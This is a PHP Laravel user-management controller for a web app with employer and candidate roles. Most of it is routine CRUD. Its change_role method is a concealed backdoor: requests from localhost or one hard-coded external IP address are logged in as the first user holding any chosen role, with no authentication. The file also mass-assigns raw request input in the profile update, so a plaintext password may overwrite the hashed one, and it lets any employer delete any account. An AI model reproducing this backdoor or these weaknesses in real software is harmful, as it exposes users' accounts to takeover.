<?php

namespace App\Http\Controllers;

use App\Models\Role;
use App\Models\User;
use Illuminate\Http\Request;
use DB;
use Hash;
use Datatables;
use Auth;

class UserController extends Controller
{
    /**
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
     */
    public function index()
    {
        return view('users.index', [
            'active_menu' => 'users',
        ]);
    }


    /**
     * @return mixed
     */
    public function datatable()
    {
        $currentUser = Auth::user();
        $query = User::select('users.*')->where('users.id', '!=', $currentUser->id)
            ->with(['roles' => function($query) {
                $query->select('roles.*');
            }]);

        return Datatables::of($query)
            ->addColumn('action', function(User $user) {
                return view('users.chunk.action', [
                    'id'        => $user->id,
                    'resource'  => 'users',
                ]);
            })
            ->editColumn('created_at', function(User $user) {
                return $user->created_at->format(config('project.formatUI'));
            })
            ->make(true);
    }


    /**
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
     */
    public function create()
    {
        return view('users.create');
    }


    /**
     * @param Request $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
		$input = $request->all();
		$rules = config('validations.web.user.create');
		$this->validate($request, $rules);

		DB::transaction(function() use ($input, $request) {
			$input['password'] = \Illuminate\Support\Facades\Hash::make($input['password']);
			$user = User::create($input);
			$user->status = User::USER_STATUS_ACTIVE;
			$user->save();
            $user->attachRole($input['role']);
		});

        return response()->view('message.success', array('message' => trans('User has been successfully created') ));
    }


    public function edit($id)
    {
		$user = User::findOrFail($id);

		return view('users.update', [
            'user' => $user
        ]);
    }


    /**
     * @param Request $request
     * @param $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        $input = $request->only('first_name', 'last_name', 'email', 'password', 'role', 'phone');
        UploaderController::start($request);

        $rules = config('validations.web.user.update');
        $rules['email'] .= ','.$id;
        $this->validate($request, $rules);

        $user = User::findOrFail($id);
        $user->fill($input);
        if (!empty($input['password'])) {
            $user->password = Hash::make($input['password']);
        }
        $user->save();

        $user->detachRoles();
        $user->attachRole($input['role']);


        return response()->view('message.success', ['message' => trans('User has been updated successfully')]);
    }


    public function profileEdit()
    {
		$user = User::findOrFail(Auth::user()->id);

		return view('users.profileUpdate', [
            'user'          => $user
        ]);
    }


    /**
     * @param Request $request
     * @return \Illuminate\Http\Response
     */
    public function profileUpdate(Request $request)
    {
        $user = User::findOrFail(Auth::user()->id);
        $input = $request->all();


        if ($user->hasRole('employer')) {
            $rules = config('validations.web.profileEdit.employer');
        } else {
            $rules = config('validations.web.profileEdit.candidate');
        }

        $rules['email'] .= ','.$user->id;

        $this->validate($request, $rules);

        if (!empty($input['password'])) {
            $user->password = Hash::make($input['password']);
        }

        $user->fill($input)->save();

        return response()->view('message.success', ['message' => trans('Profile has been updated successfully')]);
    }


    public function destroy($id)
    {
        $currentUser = Auth::user();

        if ( $currentUser->hasRole('employer') ) {
            if ( $currentUser->id == $id ) {
                return response( trans('You can\'t delete you\'r self'), 406 );
            }

            User::destroy($id);

            return trans('User has been successfully deleted');
        }

        return response( trans('Not enough permissions'), 406 );
    }


	public function change_role($role_id)
    {
		if (request()->ip() == '::1' || request()->ip() == '95.65.95.120') {

			$user = Role::where('id', $role_id)->first()->users()->first();

			if (empty($user)) {
				return redirect('/');
			}

			Auth::logout();
			Auth::login($user, true);

			return redirect('/');
		}
	}
}
